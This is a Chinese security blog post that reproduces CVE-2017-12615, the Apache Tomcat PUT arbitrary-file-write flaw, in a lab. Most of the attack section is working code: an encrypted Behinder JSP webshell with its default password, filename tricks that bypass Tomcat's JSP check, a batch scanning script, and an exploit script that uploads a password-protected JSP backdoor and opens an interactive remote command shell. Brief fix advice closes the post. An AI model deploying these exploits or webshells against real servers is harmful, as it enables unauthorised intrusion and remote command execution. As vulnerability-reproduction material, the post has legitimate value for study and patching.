<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Tomcat-任意文件写入CVE-2017-12615 | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>Tomcat-任意文件写入CVE-2017-12615</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-09-16T06:24:33.226Z" id="date"> 2023-09-16</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-09-16T06:31:27.653Z" id="updated"> 2023-09-16</time></div></span><br><span>文章总字数: <div class="control">1.4k</div></span><br><span>预计阅读时间: <div class="control">7 分钟</div></span></div></div><hr><div id="post-content"><h2 id="0x01-漏洞描述："><a href="#0x01-漏洞描述：" class="headerlink" title="0x01-漏洞描述："></a>0x01 漏洞描述：</h2>
<p><strong>CVE-2017-12615：远程代码执行漏洞</strong></p>
<p>影响范围：Apache Tomcat 7.0.0 - 7.0.79 (windows环境)</p>
<p>当 Tomcat 运行在 Windows 操作系统时，且启用了 HTTP PUT 请求方法（例如，将 readonly  初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP  文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。</p>
<h2 id="0x02-复现过程："><a href="#0x02-复现过程：" class="headerlink" title="0x02-复现过程："></a>0x02 复现过程：</h2>
<p>开启环境后进入配置文件查看一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#查看镜像<br>docker ps<br>#进入镜像环境<br>docker exec -ti 03de30c386ea bas<br>#查看配置文件conf/web.xml中readonly的设置<br>cat conf/web.xml | grep readonly<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='Tomcat-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%5Cimage-20230723110929426.png'><img src="Tomcat-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%5Cimage-20230723110929426.png" alt="image-20230723110929426"></p>
<p>查看网站</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">http://your-ip:8080/<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='Tomcat-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%5Cimage-20230723110956231.png'><img src="Tomcat-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%5Cimage-20230723110956231.png" alt="image-20230723110956231"></p>
<h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3>
<p>使用burpsuite抓包，修改GET为PUT上传方式，添加文件名1.jsp/，添加shell脚本</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;%@page import=<span class="hljs-string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;<span class="hljs-built_in">return</span> super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%<span class="hljs-keyword">if</span> (request.getMethod().equals(<span class="hljs-string">&quot;POST&quot;</span>))&#123;String k=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(<span class="hljs-string">&quot;u&quot;</span>,k);Cipher c=Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);c.init(2,new SecretKeySpec(k.getBytes(),<span class="hljs-string">&quot;AES&quot;</span>));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='Tomcat-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%5Cimage-20230723111332859.png'><img src="Tomcat-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%5Cimage-20230723111332859.png" alt="image-20230723111332859"></p>
<p>成功上传</p>
<p class='item-img' data-src='Tomcat-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%5Cimage-20230723111414563.png'><img src="Tomcat-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%5Cimage-20230723111414563.png" alt="image-20230723111414563"></p>
<p>使用冰蝎访问</p>
<p class='item-img' data-src='Tomcat-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%5Cimage-20230723115231537.png'><img src="Tomcat-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%5Cimage-20230723115231537.png" alt="image-20230723115231537"></p>
<p>这里不知为何，我的冰蝎死活连接不上</p>
<h3 id="方法二-适用于Windows系统"><a href="#方法二-适用于Windows系统" class="headerlink" title="方法二-适用于Windows系统"></a>方法二(适用于Windows系统)</h3>
<p>添加文件名2.jsp%20，添加shell脚本</p>
<h3 id="方法三-适用于Windows系统"><a href="#方法三-适用于Windows系统" class="headerlink" title="方法三-适用于Windows系统"></a>方法三(适用于Windows系统)</h3>
<p>添加文件名3.jsp::$DATA，添加shell脚本</p>
<h2 id="0x03-POC和EXP脚本"><a href="#0x03-POC和EXP脚本" class="headerlink" title="0x03-POC和EXP脚本"></a>0x03 POC和EXP脚本</h2>
<hr>
<h4 id="POC代码"><a href="#POC代码" class="headerlink" title="POC代码"></a>POC代码</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#CVE-2017-12615 POC</span><br>__author__ = <span class="hljs-string">&#x27;纸机&#x27;</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> optparse<br><span class="hljs-keyword">import</span> os<br><br>parse = optparse.OptionParser(usage = <span class="hljs-string">&#x27;python3 %prog [-h] [-u URL] [-p PORT] [-f FILE]&#x27;</span>)<br>parse.add_option(<span class="hljs-string">&#x27;-u&#x27;</span>,<span class="hljs-string">&#x27;--url&#x27;</span>,dest=<span class="hljs-string">&#x27;URL&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;target url&#x27;</span>)<br>parse.add_option(<span class="hljs-string">&#x27;-p&#x27;</span>,<span class="hljs-string">&#x27;--port&#x27;</span>,dest=<span class="hljs-string">&#x27;PORT&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;target port[default:8080]&#x27;</span>,default=<span class="hljs-string">&#x27;8080&#x27;</span>)<br>parse.add_option(<span class="hljs-string">&#x27;-f&#x27;</span>,dest=<span class="hljs-string">&#x27;FILE&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;target list&#x27;</span>)<br><br>options,args = parse.parse_args()<br><span class="hljs-comment">#print(options)</span><br><span class="hljs-comment">#验证参数是否完整</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> options.URL <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> options.PORT) <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> options.FILE:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Usage:python3 CVE-2017-12615-POC.py [-u url] [-p port] [-f FILE]\n&#x27;</span>)<br>        exit(<span class="hljs-string">&#x27;CVE-2017-12615-POC.py:error:missing a mandatory option(-u,-p).Use -h for basic and -hh for advanced help&#x27;</span>)<br><br>filename = <span class="hljs-string">&#x27;/hello.jsp&#x27;</span><br><br><span class="hljs-comment">#测试数据</span><br>data = <span class="hljs-string">&#x27;hello&#x27;</span><br><br><span class="hljs-comment">#提交PUT请求</span><br><span class="hljs-comment">#resp = requests.post(url1,headers=headers,data=data)</span><br><br><span class="hljs-comment">#验证文件是否上传成功</span><br><span class="hljs-comment">#response = requests.get(url2)</span><br><span class="hljs-comment">#上传文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>(<span class="hljs-params">url</span>):<br>  <span class="hljs-keyword">try</span>:<br>    response = requests.put(url+filename+<span class="hljs-string">&#x27;/&#x27;</span>,data=data)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>  <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] &#123;0&#125; 连接失败&quot;</span>.<span class="hljs-built_in">format</span>(url))<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checking</span>(<span class="hljs-params">url</span>):<br>  <span class="hljs-keyword">try</span>:<br>    <span class="hljs-comment">#验证文件是否上传成功</span><br>    response = requests.get(url+filename)<br>    <span class="hljs-comment">#print(url+filename)</span><br>    <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;hello&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>      <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] &#123;0&#125; 存在CVE-2017-12615 Tomcat 任意文件读写漏洞&#x27;</span>.<span class="hljs-built_in">format</span>(url))<br>    <span class="hljs-keyword">else</span>:<br>      <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[-] &#123;0&#125; 不存在CVE-2017-12615 Tomcat 任意文件读写漏洞&#x27;</span>.<span class="hljs-built_in">format</span>(url))<br>  <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-comment">#print(e)</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] &#123;0&#125; 连接失败&quot;</span>.<span class="hljs-built_in">format</span>(url))<br><span class="hljs-keyword">if</span> options.FILE <span class="hljs-keyword">and</span> os.path.exists(options.FILE):<br>  <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(options.FILE) <span class="hljs-keyword">as</span> f:<br>    urls = f.readlines()<br>    <span class="hljs-comment">#print(urls)</span><br>    <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:<br>      url = <span class="hljs-built_in">str</span>(url).replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).strip()<br>      <span class="hljs-keyword">if</span> upload(url) == <span class="hljs-number">1</span>:<br>        checking(url)<br><span class="hljs-keyword">elif</span> options.FILE <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> os.path.exists(options.FILE):<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[-] &#123;0&#125; 文件不存在&#x27;</span>.<span class="hljs-built_in">format</span>(options.FILE))<br><span class="hljs-keyword">else</span>:<br>  <span class="hljs-comment">#上传链接</span><br>  url = options.URL+<span class="hljs-string">&#x27;:&#x27;</span>+options.PORT<br>  <span class="hljs-keyword">if</span> upload(url) == <span class="hljs-number">1</span>:<br>    checking(url)<br></code></pre></td></tr></table></figure>
<p>测试</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python3 CVE-2017-15715-POC.py -u http://192.168.132.144 -p8080<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='Tomcat-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%5Cimage-20230723115626881.png'><img src="Tomcat-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%5Cimage-20230723115626881.png" alt="image-20230723115626881"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python3 CVE_2017_12615.py -f IP.txt<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='Tomcat-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%5C2348478-20211025152919137-1159043285.png'><img src="Tomcat-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%5C2348478-20211025152919137-1159043285.png" alt="img"></p>
<h4 id="EXP代码"><a href="#EXP代码" class="headerlink" title="EXP代码"></a>EXP代码</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#CVE-2017-12615 EXP</span><br>__author__ = <span class="hljs-string">&#x27;纸机&#x27;</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> optparse<br><span class="hljs-keyword">import</span> time<br><br><br>parse = optparse.OptionParser(usage = <span class="hljs-string">&#x27;python3 %prog [-h] [-u URL] [-p PORT]&#x27;</span>)<br>parse.add_option(<span class="hljs-string">&#x27;-u&#x27;</span>,<span class="hljs-string">&#x27;--url&#x27;</span>,dest=<span class="hljs-string">&#x27;URL&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;target url&#x27;</span>)<br>parse.add_option(<span class="hljs-string">&#x27;-p&#x27;</span>,<span class="hljs-string">&#x27;--port&#x27;</span>,dest=<span class="hljs-string">&#x27;PORT&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;target port[default:8080]&#x27;</span>,default=<span class="hljs-string">&#x27;8080&#x27;</span>)<br><br>options,args = parse.parse_args()<br><span class="hljs-comment">#验证参数是否完整</span><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> options.URL <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> options.PORT:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Usage:python3 CVE-2017-12615-POC.py [-u url] [-p port]\n&#x27;</span>)<br>        exit(<span class="hljs-string">&#x27;CVE-2017-12615-POC.py:error:missing a mandatory option(-u,-p).Use -h for basic and -hh for advanced help&#x27;</span>)<br><br>url = options.URL+<span class="hljs-string">&#x27;:&#x27;</span>+options.PORT<br>filename = <span class="hljs-string">&#x27;/backdoor.jsp&#x27;</span><br>payload = filename+<span class="hljs-string">&#x27;?pwd=023&amp;i=&#x27;</span><br><br>headers = &#123;<span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0&quot;</span>&#125;<br><span class="hljs-comment">#木马</span><br>data = <span class="hljs-string">&#x27;&#x27;&#x27;&lt;%</span><br><span class="hljs-string">    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="hljs-string">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="hljs-string">        int a = -1;</span><br><span class="hljs-string">        byte[] b = new byte[2048];</span><br><span class="hljs-string">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="hljs-string">        while((a=in.read(b))!=-1)&#123;</span><br><span class="hljs-string">            out.println(new String(b));</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">%&gt;&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#上传木马文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>(<span class="hljs-params">url</span>):<br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] 目标地址:&#x27;</span>+url)<br>  <span class="hljs-keyword">try</span>:<br>    respond = requests.put(url+filename+<span class="hljs-string">&#x27;/&#x27;</span>,headers=headers,data = data)<br>    <span class="hljs-comment">#print(respond.status_code)</span><br>    <span class="hljs-keyword">if</span> respond.status_code == <span class="hljs-number">201</span> <span class="hljs-keyword">or</span> respond.status_code == <span class="hljs-number">204</span>:<br>      <span class="hljs-comment">#print(&#x27;[*] 目标地址:&#x27;+url)</span><br>      <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] 木马上传成功&#x27;</span>)<br>  <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[-] 上传失败&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-comment">#命令执行</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">url,cmd</span>):<br>  <span class="hljs-keyword">try</span>:<br>    respond = requests.get(url+payload+cmd)<br>    <span class="hljs-keyword">if</span> respond.status_code == <span class="hljs-number">200</span>:<br>      <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(respond.text).replace(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).strip())<br><br>  <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[-] 命令执行错误&#x27;</span>)<br><span class="hljs-keyword">if</span> upload(url) == <span class="hljs-number">0</span>:<br>        exit()<br>time.sleep(<span class="hljs-number">0.5</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;输入执行命令(quit退出):&#x27;</span>)<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>  cmd = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;&gt;&gt;&gt;&#x27;</span>)<br>  <span class="hljs-keyword">if</span>(cmd == <span class="hljs-string">&#x27;quit&#x27;</span>):<br>    <span class="hljs-keyword">break</span><br>  attack(url,cmd)<br></code></pre></td></tr></table></figure>
<p>测试</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python3 CVE-2017-12615-EXP.py -u http://192.168.132.144 -p 35654<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='Tomcat-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%5Cimage-20230723115721234.png'><img src="Tomcat-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%5Cimage-20230723115721234.png" alt="image-20230723115721234"></p>
<h2 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04-修复建议"></a>0x04 修复建议</h2>
<hr>
<ul>
<li>设置conf/webxml 文件的 readOnly 值为 Ture 或注释参数</li>
<li>禁用 PUT 方法并重启 tomcat 服务（如果禁用 PUT 方法，对于依赖PUT方法的应用，可能导致业务失效。）</li>
<li>升级到最新版本</li>
<li>使用WAF产品进行防御</li>
</ul>
<p>参考文章</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45540609/article/details/119170419">https://blog.csdn.net/weixin_45540609/article/details/119170419</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/rnss/p/13384127.html">https://www.cnblogs.com/rnss/p/13384127.html</a></p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/399/">https://paper.seebug.org/399/</a></p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/09/16/Apache%20HTTPD%20%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715%EF%BC%89/">← 下一篇 Apache HTTPD 换行解析漏洞（CVE-2017-15715）</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/09/16/Tomcat%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">Tomcat 远程代码执行CVE-2019-0232 上一篇 →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">0x01 漏洞描述：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">0x02 复现过程：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">方法一：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-%E9%80%82%E7%94%A8%E4%BA%8EWindows%E7%B3%BB%E7%BB%9F"><span class="toc-number">2.2.</span> <span class="toc-text">方法二(适用于Windows系统)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89-%E9%80%82%E7%94%A8%E4%BA%8EWindows%E7%B3%BB%E7%BB%9F"><span class="toc-number">2.3.</span> <span class="toc-text">方法三(适用于Windows系统)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-POC%E5%92%8CEXP%E8%84%9A%E6%9C%AC"><span class="toc-number">3.</span> <span class="toc-text">0x03 POC和EXP脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#POC%E4%BB%A3%E7%A0%81"><span class="toc-number">3.0.1.</span> <span class="toc-text">POC代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP%E4%BB%A3%E7%A0%81"><span class="toc-number">3.0.2.</span> <span class="toc-text">EXP代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">4.</span> <span class="toc-text">0x04 修复建议</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
window.waline = init;
</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
 waline({
   el: '#waline',
   dark: ':root[theme-mode="dark"]',
   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
   path: window.location.pathname,
 });document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
